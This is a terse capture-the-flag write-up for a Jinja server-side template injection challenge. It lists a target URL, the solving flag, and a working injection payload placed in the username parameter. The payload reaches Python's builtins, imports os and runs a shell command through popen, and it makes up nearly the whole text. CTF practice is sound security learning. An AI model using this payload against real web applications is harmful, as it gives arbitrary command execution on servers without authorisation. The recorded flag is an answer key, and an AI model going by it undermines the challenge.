This was a Server Side template Injection Challenge 

URL : http://51.20.10.121:8002/

Injection part : http://51.20.10.121:8002/?username={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()}}

Flag : CrackOn{jinja_ssti_escape}